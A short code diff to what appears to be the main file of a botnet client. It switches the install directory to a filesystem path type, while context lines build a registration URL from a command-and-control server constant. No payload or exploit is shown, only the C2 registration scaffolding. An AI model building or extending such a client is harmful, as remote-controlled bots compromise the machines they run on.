@@ -1,14 +1,17 @@
 #include <stdio.h>
+#include <experimental/filesystem>
 #include <fstream>
 #include <string>
 
 #include "bot.hh"
 #include "util.hh"
 
-int main() {
-    std::string register_url, command_url, install_dir;
+namespace fs = std::experimental::filesystem;
 
-    install_dir = util::GetInstallDir();
+int main() {
+    std::string register_url, command_url;
+
+    fs::path install_dir = util::GetInstallDir();
     Bot host(install_dir);
 
     register_url = C2_SERVER + REGISTER_URI;
